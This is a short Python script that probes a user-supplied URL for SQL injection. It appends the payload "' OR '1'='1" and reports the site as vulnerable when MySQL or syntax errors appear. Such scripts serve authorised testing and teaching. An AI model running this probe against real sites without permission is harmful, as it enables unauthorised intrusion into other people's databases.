import requests

def is_vulnerable(url):
    payload = "' OR '1'='1"
    try:
        r = requests.get(url + payload)
        if "mysql" in r.text.lower() or "syntax" in r.text.lower():
            print(f"[+] Vulnerable: {url}")
        else:
            print(f"[-] Not Vulnerable: {url}")
    except:
        print(f"[!] Error with URL: {url}")

target = input("Enter target URL (with ?id=): ")
is_vulnerable(target)
